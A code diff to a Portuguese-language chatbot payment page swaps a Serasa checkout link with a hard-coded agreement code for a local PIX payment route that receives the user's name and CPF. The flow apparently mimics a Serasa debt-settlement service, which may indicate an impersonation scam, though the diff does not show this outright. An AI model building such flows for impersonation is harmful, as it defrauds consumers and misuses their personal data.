@@ -657,12 +657,12 @@ export default function ChatPage() {
                 const paymentButton: Message = {
                   id: "payment-button",
                   type: "text",
-                  content: "Clique no botão a seguir para acessar a guia de pagamento",
+                  content: "Clique no botão a seguir para gerar o pagamento PIX",
                   sender: "bot",
                   timestamp: new Date(),
                   buttons: [
                     {
-                      text: "ACESSAR ÁREA DE PAGAMENTO SEGURO 🔒",
+                      text: "GERAR PAGAMENTO",
                       action: "acessar-pagamento",
                     },
                   ],
@@ -677,7 +677,13 @@ export default function ChatPage() {
   }
 
   const redirectToPayment = () => {
-    window.open("https://pagamento.serasa.com.br/checkout?acordo=83N2L618362E&valor=78.47", "_blank")
+    const params = new URLSearchParams({
+      nome: userData?.nome || "",
+      cpf: userData?.cpf || "",
+      valor: "2.00",
+      telefone: "11999999999",
+    })
+    window.location.href = `/pagamento?${params.toString()}`
   }
 
   if (!cpf) {
